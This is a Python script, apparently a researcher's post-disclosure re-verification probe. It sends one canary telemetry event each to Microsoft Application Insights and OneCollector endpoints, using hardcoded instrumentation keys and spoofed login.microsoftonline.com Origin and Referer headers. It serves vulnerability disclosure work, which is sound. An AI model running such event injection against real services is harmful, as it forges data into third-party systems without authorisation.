#!/usr/bin/env python3
"""
Church of Malware — post-disclosure re-verification (single benign canary per endpoint)
Date: 2026-09-04 · Operator: ek0ms savi0r (VULN-193698 / VULN-200045 / VULN-202543 record)
Method: ONE synthetic event per endpoint, unique canary, no bulk, no payloads, no auth.
Matches the claim boundaries in the whitepaper: acceptance != retention.
"""
import requests, json, time
from datetime import datetime, timezone

TS = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
CANARY = f"CoM-Reverify-20260904-{int(time.time())}"

AI_IKEY = "6a66a822-429e-49e0-951f-dbba255ac842"          # VULN-193698 confirmed key
OC_IKEY = "69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293"  # VULN-200045
OC_APIKEY = "69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293"

def ai_envelope():
    return {
        "name": "Microsoft.ApplicationInsights.Event",
        "time": TS,
        "iKey": AI_IKEY,
        "tags": {"ai.device.id": "com-reverify-20260904",
                 "ai.internal.sdkVersion": "1DS-Web-JS-4.4.3"},
        "data": {"baseType": "EventData",
                 "baseData": {"ver": 2, "name": "ExternalProbe",
                              "properties": {"canary": CANARY, "source": "CoM-reverify"}}}
    }

def onecollector_envelope():
    return {
        "name": "CoM.Reverify.Event",
        "time": TS,
        "ver": "4.0",
        "iKey": f"o:{OC_IKEY}",
        "ext": {},
        "data": {"baseData": {"ver": 2, "name": "ExternalProbe",
                              "properties": {"canary": CANARY, "source": "CoM-reverify"}}}
    }

def probe(label, url, payload, headers, ok_codes):
    try:
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=15)
        print(f"[{label}] HTTP {r.status_code}  (expect {ok_codes})  body={r.text[:220]!r}")
        return r.status_code
    except Exception as e:
        print(f"[{label}] ERROR {e}")
        return None

print(f"Canary: {CANARY}\n")

# 1) Application Insights (VULN-193698) — regional track endpoint
probe("AppInsights eastus-8 /v2.1/track",
      "https://eastus-8.in.applicationinsights.azure.com/v2.1/track",
      ai_envelope(),
      {"Content-Type": "application/json"},
      [200])

# 2) OneCollector browser endpoint (VULN-200045)
qs = "cors=true&content-type=application%2Fx-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-4.4.3&apikey=" + OC_APIKEY + f"&upload-time={int(time.time()*1000)}"
probe("OneCollector browser.events",
      f"https://browser.events.data.microsoft.com/OneCollector/1.0/?{qs}",
      onecollector_envelope(),
      {"Content-Type": "text/plain;charset=UTF-8",
       "Origin": "https://login.microsoftonline.com",
       "Referer": "https://login.microsoftonline.com/"},
      [204])

# 3) OneCollector vortex endpoint (VULN-200045)
probe("OneCollector vortex",
      f"https://vortex.data.microsoft.com/OneCollector/1.0/?{qs}",
      onecollector_envelope(),
      {"Content-Type": "text/plain;charset=UTF-8",
       "Origin": "https://login.microsoftonline.com",
       "Referer": "https://login.microsoftonline.com/"},
      [204])
